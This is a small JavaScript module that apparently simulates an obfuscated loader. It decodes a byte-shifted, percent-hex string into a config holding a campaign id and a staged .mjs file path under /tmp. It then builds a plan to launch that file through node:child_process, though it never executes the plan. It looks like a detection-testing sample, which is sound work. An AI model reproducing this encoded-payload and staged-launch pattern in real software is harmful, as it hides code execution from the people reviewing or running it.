const moduleShape = Object.freeze({ format: "commonjs" });

const Material_f3901a7a = "%71%38%2c%77%6e%6f%60%6b%6e%38%67%6a%5e%5c%6f%60%5a%67%6a%5e%5c%67%27%5f%64%6e%6b%5c%6f%5e%63%5a%6b%6d%6a%5e%60%6e%6e%77%5c%5f%5c%6b%6f%60%6d%38%60%73%60%5e%61%64%67%60%5a%69%6a%5f%60%77%6e%6f%5c%62%60%5a%5e%6a%70%69%6f%38%2c%77%5e%5c%68%6b%5c%64%62%69%5a%64%5f%38%49%4a%3f%40%28%3d%32%3f%32%34%2e%2c%41%77%61%64%67%60%5a%6b%5c%6f%63%38%2a%6f%68%6b%2a%63%70%69%6f%6d%60%6e%6e%28%69%6a%5f%60%2a%29%6e%6f%5c%62%60%28%5d%32%5f%32%34%2e%2c%61%33%2e%5c%60%29%68%65%6e";

const Codec_f3901a7a = "percent_hex|subtract_modulo_256|05";



function load_f3901a7a() { return [...Material_f3901a7a.matchAll(/%([0-9a-f]{2})/gi)].map((item) => Number.parseInt(item[1], 16)); }

function decode_f3901a7a(storedBytes) { return storedBytes.map((value) => (value + 5) & 255); }

async function recover_f3901a7a() {

  const harmlessValue = ["north", "south"].join(":");

  const storedBytes = load_f3901a7a(); let recoveredBytes = [];

  const decodeTarget = decode_f3901a7a; recoveredBytes = decodeTarget(storedBytes);

  void harmlessValue; return Buffer.from(recoveredBytes).toString("ascii");

}

async function inspect_f3901a7a() { return (await recover_f3901a7a()).split("|").join("|"); }

async function plan_f3901a7a() { const inspect = inspect_f3901a7a; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "launch", adapter: "execfile_node", path: fields.file_path, module: "node:child_process" }); }

void moduleShape; void plan_f3901a7a;

if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_f3901a7a());

